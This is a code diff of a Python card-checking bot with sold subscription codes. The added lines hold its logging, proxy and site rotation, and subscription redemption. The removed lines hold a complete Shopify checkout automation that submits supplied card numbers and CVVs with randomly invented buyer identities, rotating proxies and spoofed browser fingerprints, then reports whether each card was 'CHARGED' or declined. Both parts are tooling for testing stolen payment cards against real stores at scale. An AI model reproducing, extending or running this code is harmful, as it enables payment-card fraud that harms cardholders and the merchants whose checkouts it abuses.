+_ch.setFormatter(_log_fmt)
+
+log.addHandler(_ch)
+
+try:
+
+    _fh = logging.FileHandler('sonik_bot.log', encoding='utf-8')
+
+    _fh.setLevel(logging.INFO)
+
+    _fh.setFormatter(_log_fmt)
+
+    log.addHandler(_fh)
+
+except:
+
+    pass
+
+
+
+def log_user(uid, action, msg, level="info"):
+
+    getattr(log, level, log.info)(f"[USER:{uid}] [{action}] {msg}")
+
+
+
+def log_system(action, msg, level="info"):
+
+    getattr(log, level, log.info)(f"[SYSTEM] [{action}] {msg}")
+
+
+
+# ====================== BOLD SANS ======================
+
+_BOLD_SANS_MAP = {}
+
+_normal_upper = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+
+_normal_lower = "abcdefghijklmnopqrstuvwxyz"
+
+_normal_digits = "0123456789"
+
+_bold_upper = "𝗔𝗕𝗖𝗗𝗘𝗙𝗚𝗛𝗜𝗝𝗞𝗟𝗠𝗡𝗢𝗣𝗤𝗥𝗦𝗧𝗨𝗩𝗪𝗫𝗬𝗭"
+
+_bold_lower = "𝗮𝗯𝗰𝗱𝗲𝗳𝗴𝗵𝗶𝗷𝗸𝗹𝗺𝗻𝗼𝗽𝗾𝗿𝘀𝘁𝘂𝘃𝘄𝘅𝘆𝘇"
+
+_bold_digits = "𝟬𝟭𝟮𝟯𝟰𝟱𝟲𝟳𝟴𝟵"
+
+
+
+for _i, _c in enumerate(_normal_upper):
+
+    _BOLD_SANS_MAP[_c] = _bold_upper[_i]
+
+for _i, _c in enumerate(_normal_lower):
+
+    _BOLD_SANS_MAP[_c] = _bold_lower[_i]
+
+for _i, _c in enumerate(_normal_digits):
+
+    _BOLD_SANS_MAP[_c] = _bold_digits[_i]
+
+
+
+def bs(text):
+
+    if not text:
+
+        return text
+
+    return "".join(_BOLD_SANS_MAP.get(c, c) for c in str(text))
+
+
+
+# ====================== HTTP SESSIONS ======================
+
+async def get_user_http_session(uid, purpose="general"):
+
+    key = f"{uid}_{purpose}"
+
+    session = _USER_HTTP_SESSIONS.get(key)
+
+    if session is None or session.closed:
+
+        connector = aiohttp.TCPConnector(
+
+            limit=500, limit_per_host=150, ttl_dns_cache=300,
+
+            use_dns_cache=True, keepalive_timeout=60, enable_cleanup_closed=True,
+
+        )
+
+        session = aiohttp.ClientSession(
+
+            timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10),
+
+            connector=connector,
+
+        )
+
+        _USER_HTTP_SESSIONS[key] = session
+
+    return session
+
+
+
+async def cleanup_user_http_session(uid, purpose="general"):
+
+    key = f"{uid}_{purpose}"
+
+    session = _USER_HTTP_SESSIONS.pop(key, None)
+
+    if session and not session.closed:
+
         try:
-            url = "https://deposit.us.shopifycs.com/sessions"
-            payload = {
-                "credit_card": {
-                    "number": str(cc).replace(" ", ""),
-                    "name": f"{first} {last}",
-                    "month": int(mon),
-                    "year": int(year),
-                    "verification_value": str(cvv)
-                }
-            }
-            headers = {
-                'Content-Type': 'application/json',
-                'Accept': 'application/json',
-                'Origin': 'https://checkout.shopifycs.com',
-                'User-Agent': self.user_agent
-            }
-            r = await session.post(url, json=payload, headers=headers)
-            if r.status_code == 200:
-                return r.json().get('id')
-            else:
-                print(f"❌ Failed to tokenize card: {r.text}")
-                return None
-        except Exception as e:
-            print(f"❌ Tokenization error: {e}")
+
+            await session.close()
+
+        except:
+
+            pass
+
+
+
+async def get_bin_session():
+
+    global _GLOBAL_BIN_SESSION
+
+    if _GLOBAL_BIN_SESSION is None or _GLOBAL_BIN_SESSION.closed:
+
+        connector = aiohttp.TCPConnector(limit=150, limit_per_host=50)
+
+        _GLOBAL_BIN_SESSION = aiohttp.ClientSession(
+
+            timeout=aiohttp.ClientTimeout(total=BIN_TIMEOUT, connect=5),
+
+            connector=connector
+
+        )
+
+    return _GLOBAL_BIN_SESSION
+
+
+
+async def get_proxy_session():
+
+    global _GLOBAL_PROXY_SESSION
+
+    if _GLOBAL_PROXY_SESSION is None or _GLOBAL_PROXY_SESSION.closed:
+
+        connector = aiohttp.TCPConnector(limit=300, limit_per_host=100)
+
+        _GLOBAL_PROXY_SESSION = aiohttp.ClientSession(
+
+            timeout=aiohttp.ClientTimeout(total=PROXY_TIMEOUT, connect=8),
+
+            connector=connector
+
+        )
+
+    return _GLOBAL_PROXY_SESSION
+
+
+
+# ====================== CODE SYSTEM ======================
+
+def generate_code(length=8):
+
+    """Generate a random code for subscription"""
+
+    chars = string.ascii_uppercase + string.digits
+
+    return ''.join(random.choices(chars, k=length))
+
+
+
+async def create_subscription_code(admin_id, hours):
+
+    """Create a new subscription code"""
+
+    code = generate_code()
+
+    expiry = datetime.now(timezone.utc) + timedelta(hours=CODE_EXPIRY_HOURS)
+
+    
+
+    code_data = {
+
+        "code": code,
+
+        "hours": hours,
+
+        "created_by": admin_id,
+
+        "created_at": datetime.now(timezone.utc),
+
+        "expires_at": expiry,
+
+        "used": False,
+
+        "used_by": None,
+
+        "used_at": None
+
+    }
+
+    
+
+    await db["codes"].insert_one(code_data)
+
+    return code
+
+
+
+async def redeem_code(user_id, code):
+
+    """Redeem a subscription code for a user"""
+
+    code_data = await db["codes"].find_one({"code": code.upper()})
+
+    
+
+    if not code_data:
+
+        return {"success": False, "message": "Invalid code"}
+
+    
+
+    if code_data.get("used", False):
+
+        return {"success": False, "message": "Code already used"}
+
+    
+
+    # Fix: Compare timezone-aware datetimes properly
+
+    expires_at = code_data.get("expires_at")
+
+    if expires_at:
+
+        # If expires_at is naive, make it aware
+
+        if expires_at.tzinfo is None:
+
+            expires_at = expires_at.replace(tzinfo=timezone.utc)
+
+        # Compare with current time (which is timezone-aware)
+
+        if expires_at < datetime.now(timezone.utc):
+
+            return {"success": False, "message": "Code expired"}
+
+    
+
+    # Check if user already has active subscription
+
+    if await is_user_subscribed(user_id):
+
+        return {"success": False, "message": "You already have an active subscription"}
+
+    
+
+    # Update code as used
+
+    await db["codes"].update_one(
+
+        {"code": code.upper()},
+
+        {"$set": {
+
+            "used": True,
+
+            "used_by": user_id,
+
+            "used_at": datetime.now(timezone.utc)
+
+        }}
+
+    )
+
+    
+
+    # Give subscription to user
+
+    hours = code_data.get("hours", 1)
+
+    await set_user_subscription(user_id, "code_redeem", hours)
+
+    
+
+    return {
+
+        "success": True,
+
+        "message": f"Subscription added! {hours} hours",
+
+        "hours": hours
+
+    }
+
+
+
+async def get_code_info(code):
+
+    """Get information about a code"""
+
+    return await db["codes"].find_one({"code": code.upper()})
+
+
+
+# ====================== SMART ROTATOR ======================
+
+class SmartRotator:
+
+    def __init__(self):
+
+        self._site_fails = {}
+
+        self._proxy_fails = {}
+
+        self._site_idx = 0
+
+        self._proxy_idx = 0
+
+
+
+    def pick_site(self, sites, exclude=None):
+
+        if not sites:
+
             return None
 
-    def get_random_info(self):
-        address = random.choice(_POOL_ADDRESSES)
-        first_name = random.choice(_POOL_FIRST_NAMES)
-        last_name = random.choice(_POOL_LAST_NAMES)
-        email_domain = random.choice(_POOL_EMAIL_DOMAINS)
-        _fmt = random.randint(0, 4)
-        if _fmt == 0:
-            email = f"{first_name.lower()}.{last_name.lower()}{random.randint(1, 9999)}@{email_domain}"
-        elif _fmt == 1:
-            email = f"{first_name.lower()}{last_name.lower()}{random.randint(10, 999)}@{email_domain}"
-        elif _fmt == 2:
-            email = f"{first_name.lower()[0]}{last_name.lower()}{random.randint(1, 99)}@{email_domain}"
-        elif _fmt == 3:
-            email = f"{first_name.lower()}_{last_name.lower()}{random.randint(1, 9999)}@{email_domain}"
-        else:
-            email = f"{last_name.lower()}.{first_name.lower()}{random.randint(1, 999)}@{email_domain}"
-        phone = random.choice(_POOL_PHONES)
-        
-        return {
-            "fname": first_name,
-            "lname": last_name,
-            "email": email,
-            "phone": phone,
-            "add1": address["add1"],
-            "city": address["city"],
-            "state": address["state"],
-            "state_short": address["state_short"],
-            "zip": address["zip"]
-        }
+        exclude = exclude or set()
 
-async def main():
-    proxy_input = input("Enter proxy (optional): single ip:port, or file:proxies.txt, or ip1:port1,ip2:port2: ").strip()
-    proxy_list = load_proxy_list(proxy_input) if proxy_input else []
-    if not proxy_list and proxy_input:
-        proxy_url = format_proxy(proxy_input)
-        proxy_list = [proxy_url] if proxy_url else []
-    proxy_url = random.choice(proxy_list) if proxy_list else None
-    if proxy_url:
-        print(f"   Using proxy (rotated): {proxy_url.split('@')[-1] if '@' in proxy_url else proxy_url}")
-    else:
-        print("   No proxy.")
-    fingerprint = get_random_fingerprint()
-    print("   Fingerprint randomized for this run.")
-    async with _create_async_client(proxy_url=proxy_url, timeout=30.0, chrome_version=fingerprint.get("_chrome_ver")) as session:
-        try:
-            site = input('enter the shopify site url (e.g., https://site.com): ').strip().rstrip('/')
-            site_url = site 
-            
-            card_input = input('enter card number (cc|mm|yy|cvv): ').strip()
-            try:
-                cc, mon, year, cvv = card_input.split('|')
-            except ValueError:
-                print("❌ Invalid card format. Using placeholders.")
-                cc, mon, year, cvv = "0000000000000000", "01", "25", "123"
-            
-            shop = ShopifyAuto(fingerprint=fingerprint)
-            product_header = {k: v for k, v in fingerprint.items() if k.lower() in _HEADER_FILTER_FULL}
-            if not any(k.lower() == "user-agent" for k in product_header):
-                product_header["User-Agent"] = shop.user_agent
+        available = [s for s in sites if s not in exclude and self._site_fails.get(s, 0) < 5]
 
-            await asyncio.sleep(random.uniform(0.8, 2.0))
-            print("visiting the product page to get the variant id and cookies")
-            try:
-                product_response = await _retry_async_request(session.get, site + '/products.json', headers=product_header)
-                products_data = product_response.json()
-                product = products_data['products'][0]
-                product_id = product['id']
-                product_handle = product['handle']
-                variant_id = product['variants'][0]['id']
-                price = product['variants'][0]['price']
-                
-                print(f" ✅ Product: {product['title']}")
-                print(f" ✅ Product ID: {product_id}")
-                print(f" ✅ Variant ID: {variant_id}")
-                print(f" ✅ Price: ${price}")
-            except Exception as e:
-                print(f"❌ Failed to fetch product info: {e}")
-                return
+        if not available:
 
-            print("\n Visiting product page to get cookies...")
-            product_page_response = await _retry_async_request(session.get, f"{site}/products/{product_handle}", headers=product_header)
-            print(f"   Status: {product_page_response.status_code}")
+            available = [s for s in sites if s not in exclude]
 
-            await _retry_async_request(session.get, site + '/cart.js', headers=product_header)
+        if not available:
 
-            add_data = {
-                'id': str(variant_id),
-                'quantity': '1',
-                'form_type': 'product',
-            }
+            available = list(sites)
 
-            print("\n Adding item to cart...")
-            response = await _retry_async_request(session.post, site + '/cart/add.js', headers=product_header, data=add_data)
-            print(f"   Response Status: {response.status_code}")
-            
-            if response.status_code == 200:
-                print("   ✅ Item added to cart!")
-                
-                cart_response = await _retry_async_request(session.get, f"{site}/cart.js", headers=product_header)
-                cart_data = cart_response.json()
-                token = cart_data['token']
-                print(f"   Cart token: {token}")
-                print(f"   Items in cart: {cart_data['item_count']}")
-                
-                print ('now you will be redirected to the checkout page, wait.....')
-                
-                checkout_headers = {
-                    **{k: v for k, v in product_header.items() if k.lower() in _HEADER_FILTER_SMALL},
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'origin': site,
-                    'referer': f"{site}/cart",
-                }
-                
-                await _retry_async_request(session.get, f"{site}/checkout", headers=checkout_headers) 
-                
-                checkout_data = {
-                    'checkout': '',  
-                    'updates[]': '1', 
-                }
-                
-                checkout_response = await _retry_async_request(session.post, f"{site}/cart", headers=checkout_headers, data=checkout_data)
-                
-                print(f"   Final URL after redirect: {checkout_response.url}")
-                checkout_page_url = str(checkout_response.url)
+        self._site_idx = (self._site_idx + 1) % len(available)
 
-                response_text2 = checkout_response.text
-
-                x_checkout_one_session_token = re.search(
-                    r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', 
-                    response_text2
-                )
-
-                session_token = None
-                if x_checkout_one_session_token:
-                    session_token = x_checkout_one_session_token.group(1)
-                    print(f" ✅Full session token length: {len(session_token)}")
-                    print(f" ✅Session token: {session_token}")
-
-                queue_token = find_between(response_text2, 'queueToken&quot;:&quot;', '&quot;')
-                print(f" ✅queue_token={queue_token}")
-                stable_id = find_between(response_text2, 'stableId&quot;:&quot;', '&quot;')
-                print(f" ✅stable_id={stable_id}")
-                paymentMethodIdentifier = find_between(response_text2, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
-                print(f" ✅paymentMethodIdentifier={paymentMethodIdentifier}")
-
-                await asyncio.sleep(1)
-
-                print("\n STEP 5: Creating payment session...")
-                random_info = shop.get_random_info()
-                fname = random_info["fname"]
-                lname = random_info["lname"]
-                email = random_info["email"]
-                phone = random_info["phone"]
-                add1 = random_info["add1"]
-                city = random_info["city"]
-                state_short = random_info["state_short"]
-                zip_code = str(random_info["zip"])
-
-                print(f" Using address: {add1}, {city}, {state_short} {zip_code}")
-                print(f" Using phone: {phone}")
-
-                session_endpoints = [
-                    "https://deposit.us.shopifycs.com/sessions",
-                    "https://checkout.pci.shopifyinc.com/sessions",
-                    "https://checkout.shopifycs.com/sessions"
-                ]
-                        
-                session_created = False
-                sessionid = None
-                        
-                for endpoint in session_endpoints:
-                    try:
-                        print(f" Trying payment session endpoint: {endpoint}")
-                        headers = {
-                            'accept': 'application/json',
-                            'content-type': 'application/json',
-                            'origin': 'https://checkout.shopifycs.com',
-                            'referer': 'https://checkout.shopifycs.com/',
-                            'user-agent': shop.user_agent,
-                        }
-
-                        json_data = {  
-                            'credit_card': {
-                                'number': cc,
-                                'month': mon,
-                                'year': year,
-                                'verification_value': cvv,
-                                'name': fname + ' ' + lname,
-                            },
-                            'payment_session_scope': urlparse(site_url).netloc,
-                        }
-
-                        session_response = await session.post(endpoint, headers=headers, json=json_data)
-                        print(f" Payment Session Response Status from {endpoint}: {session_response.status_code}")
-                                
-                        if session_response.status_code == 200:
-                            session_data = session_response.json()
-                            if "id" in session_data:
-                                sessionid = session_data["id"]
-                                session_created = True
-                                print(f"✅ Payment session created at {endpoint}: {sessionid}")
-                                break
-                        else:
-                            print(f"⚠️ {endpoint} returned {session_response.status_code}")
-                    except Exception as e:
-                        print(f"⚠️ Error trying {endpoint}: {e}")
-
-                if session_created:
-                    await asyncio.sleep(1)
-                    
-                    graphql_url = f"{site_url}/checkouts/unstable/graphql"
-                    
-
-                    tokens = {
-                        'x_checkout_one_session_token': session_token,
-                        'queue_token': queue_token,
-                        'stable_id': stable_id,
-                        'paymentMethodIdentifier': paymentMethodIdentifier
-                    }
+        return available[self._site_idx]
 
 
-                    for attempt in range(3):
-                        print(f"\n Submitting GraphQL payment (Attempt {attempt + 1})...")
-                        
-                        graphql_headers = {
-                            'accept': 'application/json',
-                            'accept-language': 'en-US,en;q=0.9',
-                            'content-type': 'application/json',
-                            'origin': site_url,
-                            'referer': f"{site_url}/",
-                            'user-agent': shop.user_agent,
-                            'x-checkout-one-session-token': session_token,
-                            'x-checkout-web-deploy-stage': 'production',
-                            'x-checkout-web-server-handling': 'fast',
-                            'x-checkout-web-source-id': token.split('?')[0] if '?' in token else token,
-                        }
 
-                        random_page_id = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(1000, 9999):04X}-{random.randint(100000000000, 999999999999):012X}"
+    def pick_proxy(self, proxies, exclude=None):
 
-                        graphql_payload = {
-                            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{...on NegotiationError{code localizedMessage __typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken __typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token __typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id __typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}__typename}',
-                            'variables': {
-                                'input': {
-                                    'checkpointData': None,
-                                    'sessionInput': {
-                                        'sessionToken': session_token,
-                                    },
-                                    'queueToken': queue_token,
-                                    'discounts': {
-                                        'lines': [],
-                                        'acceptUnexpectedDiscounts': True,
-                                    },
-                                    'delivery': {
-                                        'deliveryLines': [
-                                            {
-                                                'selectedDeliveryStrategy': {
-                                                    'deliveryStrategyMatchingConditions': {
-                                                        'estimatedTimeInTransit': {'any': True},
-                                                        'shipments': {'any': True},
-                                                    },
-                                                    'options': {},
-                                                },
-                                                'targetMerchandiseLines': {
-                                                    'lines': [{'stableId': stable_id}],
-                                                },
-                                                'destination': {
-                                                    'streetAddress': {
-                                                        'address1': add1,
-                                                        'address2': '',
-                                                        'city': city,
-                                                        'countryCode': 'US',
-                                                        'postalCode': zip_code,
-                                                        'company': '',
-                                                        'firstName': fname,
-                                                        'lastName': lname,
-                                                        'zoneCode': state_short,
-                                                        'phone': phone,
-                                                    },
-                                                },
-                                                'deliveryMethodTypes': ['SHIPPING'],
-                                                'expectedTotalPrice': {'any': True},
-                                                'destinationChanged': True,
-                                            },
-                                        ],
-                                        'noDeliveryRequired': [],
-                                        'useProgressiveRates': False,
-                                        'prefetchShippingRatesStrategy': None,
-                                    },
-                                    'merchandise': {
-                                        'merchandiseLines': [
-                                            {
-                                                'stableId': stable_id,
-                                                'merchandise': {
-                                                    'productVariantReference': {
-                                                        'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
-                                                        'variantId': f'gid://shopify/ProductVariant/{variant_id}',
-                                                        'properties': [],
-                                                        'sellingPlanId': None,
-                                                        'sellingPlanDigest': None,
-                                                    },
-                                                },
-                                                'quantity': {'items': {'value': 1}},
-                                                'expectedTotalPrice': {'any': True},
-                                                'lineComponentsSource': None,
-                                                'lineComponents': [],
-                                            },
-                                        ],
-                                    },
-                                    'payment': {
-                                        'totalAmount': {'any': True},
-                                        'paymentLines': [
-                                            {
-                                                'paymentMethod': {
-                                                    'directPaymentMethod': {
-                                                        'paymentMethodIdentifier': paymentMethodIdentifier,
-                                                        'sessionId': sessionid,
-                                                        'billingAddress': {
-                                                            'streetAddress': {
-                                                                'address1': add1,
-                                                                'address2': '',
-                                                                'city': city,
-                                                                'countryCode': 'US',
-                                                                'postalCode': zip_code,
-                                                                'company': '',
-                                                                'firstName': fname,
-                                                                'lastName': lname,
-                                                                'zoneCode': state_short,
-                                                                'phone': phone,
-                                                            },
-                                                        },
-                                                        'cardSource': None,
-                                                    },
-                                                },
-                                                'amount': {'any': True},
-                                                'dueAt': None,
-                                            },
-                                        ],
-                                        'billingAddress': {
-                                            'streetAddress': {
-                                                'address1': add1,
-                                                'address2': '',
-                                                'city': city,
-                                                'countryCode': 'US',
-                                                'postalCode': zip_code,
-                                                'company': '',
-                                                'firstName': fname,
-                                                'lastName': lname,
-                                                'zoneCode': state_short,
-                                                'phone': phone,
-                                            },
-                                        },
-                                    },
-                                    'buyerIdentity': {
-                                        'buyerIdentity': {
-                                            'presentmentCurrency': 'USD',
-                                            'countryCode': 'US',
-                                        },
-                                        'contactInfoV2': {
-                                            'emailOrSms': {
-                                                'value': email,
-                                                'emailOrSmsChanged': False,
-                                            },
-                                        },
-                                        'marketingConsent': [{'email': {'value': email}}],
-                                        'shopPayOptInPhone': {'countryCode': 'US'},
-                                    },
-                                    'tip': {'tipLines': []},
-                                    'taxes': {
-                                        'proposedAllocations': None,
-                                        'proposedTotalAmount': {'any': True} if attempt >= 1 else {'value': {'amount': '0', 'currencyCode': 'USD'}},
-                                        'proposedTotalIncludedAmount': None,
-                                        'proposedMixedStateTotalAmount': None,
-                                        'proposedExemptions': [],
-                                    },
-                                    'note': {'message': None, 'customAttributes': []},
-                                    'localizationExtension': {'fields': []},
-                                    'nonNegotiableTerms': None,
-                                    'scriptFingerprint': {
-                                        'signature': None,
-                                        'signatureUuid': None,
-                                        'lineItemScriptChanges': [],
-                                        'paymentScriptChanges': [],
-                                        'shippingScriptChanges': [],
-                                    },
-                                    'optionalDuties': {'buyerRefusesDuties': False},
-                                },
-                                'attemptToken': f'{token}-{random.random()}',
-                                'metafields': [],
-                                'analytics': {
-                                    'requestUrl': f'{site_url}/checkouts/cn/{token}',
-                                    'pageId': random_page_id,
-                                },
-                            },
-                            'operationName': 'SubmitForCompletion',
-                        }
+        if not proxies:
 
-                        graphql_response = await session.post(graphql_url, headers=graphql_headers, json=graphql_payload)
-                        print(f" ✅GraphQL Response Status: {graphql_response.status_code}")
-                        
-                        if graphql_response.status_code == 200:
-                            result_data = graphql_response.json()
-                            print(f"✅ GraphQL Response: {json.dumps(result_data, indent=2)[:1000]}...")
-                            
-                            receipt_id = None
-                            error_codes = []
-                            
-                            completion = result_data.get('data', {}).get('submitForCompletion', {})
-                            
-                            if completion.get('receipt'):
-                                receipt_id = completion['receipt'].get('id')
-                                print(f"✅ Receipt ID extracted: {receipt_id}")
-                            
-                            if completion.get('__typename') == 'Throttled':
-                                print(" Throttled response detected - payment is being processed...")
-                            
-                            if completion.get('errors'):
-                                errors = completion['errors']
-                                error_codes = [e.get('code') for e in errors if 'code' in e]
-                                print(f"⚠️ Errors returned: {error_codes}")
-                                
+            return None
 
-                                soft_errors = ['TAX_NEW_TAX_MUST_BE_ACCEPTED', 'WAITING_PENDING_TERMS']
-                                
+        exclude = exclude or set()
 
-                                only_soft_errors = all(code in soft_errors for code in error_codes)
-                                if only_soft_errors:
-                                    print(" Soft errors detected (Tax/Terms) — no retry")
-                                    return
-                                
-                                non_soft_errors = [code for code in error_codes if code not in soft_errors]
-                                if non_soft_errors:
-                                    print(f"❌ Payment Rejected: {', '.join(non_soft_errors)}")
-                                    return
-                            
-                            if completion.get('reason'):
-                                print(f"❌ Payment Failed: {completion['reason']}")
-                                return
-                            
-                            if receipt_id:
-                                print(f"\n Polling for receipt status...")
-                                poll_payload = {
-                                    'query': 'query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}',
-                                    'variables': {
-                                        'receiptId': receipt_id,
-                                        'sessionToken': session_token,
-                                    },
-                                    'operationName': 'PollForReceipt'
-                                }
-                                
-                                for poll_attempt in range(10):
-                                    await asyncio.sleep(3)
-                                    print(f"Poll attempt {poll_attempt + 1}/10...")
-                                    poll_response = await session.post(graphql_url, headers=graphql_headers, json=poll_payload)
-                                    if poll_response.status_code == 200:
-                                        poll_data = poll_response.json()
-                                        receipt = poll_data.get('data', {}).get('receipt', {})
-                                        
-                                        if receipt.get('__typename') == 'ProcessedReceipt' or 'orderIdentity' in receipt:
-                                            order_id = receipt.get('orderIdentity', {}).get('id', 'N/A')
-                                            print(f"✅ CARD CHARGED! 💰🔥 Order ID: {order_id}")
-                                            return
-                                        elif receipt.get('__typename') == 'ActionRequiredReceipt':
-                                            print(f"❌ Card DECLINED (3D Secure Required)")
-                                            return
-                                        elif receipt.get('__typename') == 'FailedReceipt':
-                                            print(f"❌ Card DECLINED")
-                                            print(f"📡 Full Decline Response: {json.dumps(poll_data, indent=2)}")
-                                            return
-                                        else:
-                                            print(f"📡 Poll response (Typename: {receipt.get('__typename')}): {json.dumps(poll_data, indent=2)}")
-                                break
+        available = [p for p in proxies if p.get('proxy_url') not in exclude and self._proxy_fails.get(p.get('proxy_url'), 0) < 5]
 
-                        else:
-                            print(f"⚠️ GraphQL submission failed: {graphql_response.status_code}")
-                            if attempt == 0:
-                                await asyncio.sleep(2)
-                                continue
-                            return
-                    
-                    print("\n🔍 STEP 8: Checking final result...")
-                    checkout_url_final = f"{site_url}/checkout?from_processing_page=1&validate=true"
-                    final_response = await session.get(checkout_url_final)
-                    final_url = str(final_response.url)
-                    print(f"📍 Final URL: {final_url}")
-                    
-                    if "/thank" in final_url.lower() or "/orders/" in final_url:
-                        print(f"✅ CARD CHARGED! Payment Successful! 💰")
-                    else:
-                        print(f"⚠️ Unknown Status - Manual check needed: {final_url}")
+        if not available:
 
-        except Exception as e:
-            print(f"❌ An error occurred in main: {e}")
+            available = [p for p in proxies if p.get('proxy_url') not in exclude]
+
+        if not available:
+
+            available = list(proxies)
+
+        self._proxy_idx = (self._proxy_idx + 1) % len(available)
+
+        return available[self._proxy_idx]
 
 
-async def check_site_fast(site_url, proxy_url=None, max_price=40.0, min_price=10.0):
-    site_url = site_url.strip().rstrip("/")
-    fingerprint = get_random_fingerprint()
-    
-    product_header = {
-        "User-Agent": fingerprint.get("User-Agent", _FALLBACK_UA),
-        "Accept": "application/json, text/javascript, */*; q=0.01",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Referer": site_url,
-        "Origin": site_url,
-        "DNT": "1",
-        "Connection": "keep-alive",
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-origin",
-    }
-    
-    _proxy_fmt = None
-    if proxy_url:
-        _proxy_fmt = format_proxy(proxy_url) if isinstance(proxy_url, str) else proxy_url
-    try:
-        async with _create_async_client(proxy_url=_proxy_fmt, timeout=12.0, chrome_version=fingerprint.get("_chrome_ver")) as client:
-            r = await client.get(site_url + "/products.json", headers=product_header)
-            if r.status_code != 200:
-                return {"ok": False, "price": None, "product": "", "available": False, "error": f"HTTP {r.status_code}"}
-            
-            try:
-                data = r.json()
-            except Exception as json_err:
-                return {"ok": False, "price": None, "product": "", "available": False, "error": "Not a Shopify store"}
-            products = data.get("products") or []
-            if not products:
-                return {"ok": False, "price": None, "product": "", "available": False, "error": "No products found"}
-            
-            lowest_price = None
-            lowest_product = None
-            lowest_variant = None
-            
-            for product in products:
-                variants = product.get("variants") or []
-                for v in variants:
-                    available = v.get("available", True)
-                    if isinstance(available, str):
-                        available = available.lower() in ("true", "1", "yes")
-                    
-                    if not available:
-                        continue
-                    
-                    price_str = v.get("price") or "0"
-                    try:
-                        price_val = float(str(price_str).replace("$", "").replace(",", "").strip())
-                    except (ValueError, TypeError):
-                        continue
-                    
-                    if price_val < min_price:
-                        continue
-                    
-                    if lowest_price is None or price_val < lowest_price:
-                        lowest_price = price_val
-                        lowest_product = product
-                        lowest_variant = v
-            
-            if lowest_product is None or lowest_variant is None:
-                return {"ok": False, "price": None, "product": "", "available": False, "error": f"No products between ${min_price:.2f}-${max_price:.2f}"}
-            
-            price_str = lowest_variant.get("price") or "0"
-            ok = lowest_price <= max_price
-            
-            result = {
-                "ok": ok, 
-                "price": price_str, 
-                "product": lowest_product.get("title", "")[:60], 
-                "available": True,
-                "lowest_price": lowest_price
-            }
-            if not ok:
-                result["error"] = f"Price ${lowest_price:.2f} exceeds max ${max_price:.2f}"
-            return result
-    except _NETWORK_ERRORS as e:
-        _ename = type(e).__name__
-        if "Timeout" in _ename:
-            return {"ok": False, "price": None, "product": "", "available": False, "error": "Timeout (15s)"}
-        elif "Connect" in _ename:
-            return {"ok": False, "price": None, "product": "", "available": False, "error": "Cannot connect"}
-        else:
-            return {"ok": False, "price": None, "product": "", "available": False, "error": f"Network: {_ename}"}
-    except Exception as e:
-        error_msg = str(e)[:50]
-        if "SSL" in error_msg or "certificate" in error_msg.lower():
-            return {"ok": False, "price": None, "product": "", "available": False, "error": "SSL error"}
-        return {"ok": False, "price": None, "product": "", "available": False, "error": error_msg}
 
-_POLL_QUERY = "query PollForReceipt($receiptId:ID!,$sessionToken:String!){receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){...ReceiptDetails __typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl orderIdentity{buyerIdentifier id __typename}__typename}...on ProcessingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}__typename}__typename}__typename}"
+    def report_site_ok(self, site):
 
-_CAPTCHA_MAX_RETRIES = 0  # تم التعديل: من 1 لـ 0
+        self._site_fails[site] = 0
 
-# ── Global concurrency limiter ────────────────────────────────────────
-_MAX_CONCURRENT_CHECKS = 20  # تم التعديل: من 30 لـ 10
-_check_semaphore = None
-_active_checks = 0
 
-def get_active_checks():
-    return _active_checks
 
-def _is_captcha_result(result):
-    if not result or not isinstance(result, dict):
+    def report_site_fail(self, site):
+
+        self._site_fails[site] = self._site_fails.get(site, 0) + 1
+
+
+
+    def report_proxy_ok(self, proxy_url):
+
+        if proxy_url:
+
+            self._proxy_fails[proxy_url] = 0
+
+
+
+    def report_proxy_fail(self, proxy_url):
+
+        if proxy_url:
+
+            self._proxy_fails[proxy_url] = self._proxy_fails.get(proxy_url, 0) + 1
+
+
+
+# ====================== SITE ERROR DETECTION ======================
+
+SITE_ERROR_KEYWORDS = [
+
+    'r4 token empty', 'payment method is not shopify', 'r2 id empty',
+
+    'site requires login', 'failed to get token', 'no valid products', 'not shopify',
+
+    'failed to get checkout', 'failed to detect product', 'failed to create checkout',
+
+    'failed to get proposal data', 'site not supported', 'site error! status: 429',
+
+    'token not found', 'handle is empty', 'payment method identifier is empty',
+
+    'failed to get session token', 'failed to tokenize card', 'no_session_token',
